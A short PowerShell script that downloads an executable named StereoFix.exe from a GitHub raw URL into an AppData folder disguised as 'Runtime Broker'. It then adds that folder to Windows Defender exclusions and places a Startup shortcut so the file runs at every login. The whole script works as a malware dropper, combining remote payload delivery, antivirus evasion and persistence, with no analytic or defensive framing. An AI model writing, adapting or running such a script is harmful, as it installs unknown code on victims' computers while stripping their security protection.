# Define variables - Customize these!
$appUrl = "https://raw.githubusercontent.com/salamprajjit-alt/5132525231/main/StereoFix.exe"  # Direct raw URL to the exe file
$appName = "StereoFix.exe"                     # Name to save the exe as (include .exe for proper execution)
$folderName = "Runtime Broker"                 # Folder to create
$basePath = "$env:APPDATA"                     # Base location (AppData\Roaming)
$folderPath = "$basePath\$folderName"          # Full folder path
$downloadPath = "$folderPath\$appName"         # Save location inside the folder
$startupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$exclusionPath = $folderPath                   # Path for Defender exclusion (the whole folder)

try {
    # Create the folder if it doesn't exist
    Write-Host "Creating folder: $folderPath..."
    if (-not (Test-Path $folderPath)) {
        New-Item -Path $folderPath -ItemType Directory -ErrorAction Stop
    }
    Write-Host "Folder created or already exists."

    # Download the app into the folder
    Write-Host "Downloading $appName..."
    Invoke-WebRequest -Uri $appUrl -OutFile $downloadPath -ErrorAction Stop
    Write-Host "Download completed: $downloadPath"

    # Add the folder to Windows Defender exclusions (requires admin)
    Write-Host "Adding folder to Defender exclusions..."
    Add-MpPreference -ExclusionPath $exclusionPath -ErrorAction Stop
    Write-Host "Exclusion added."

    # Create startup shortcut
    Write-Host "Creating startup shortcut..."
    $shortcutPath = "$startupFolder\$appName.lnk"
    $wShell = New-Object -ComObject WScript.Shell
    $shortcut = $wShell.CreateShortcut($shortcutPath)
    $shortcut.TargetPath = $downloadPath
    $shortcut.Save()
    Write-Host "Shortcut created: $shortcutPath"
} catch {
    Write-Host "Error: $_" -ForegroundColor Red
}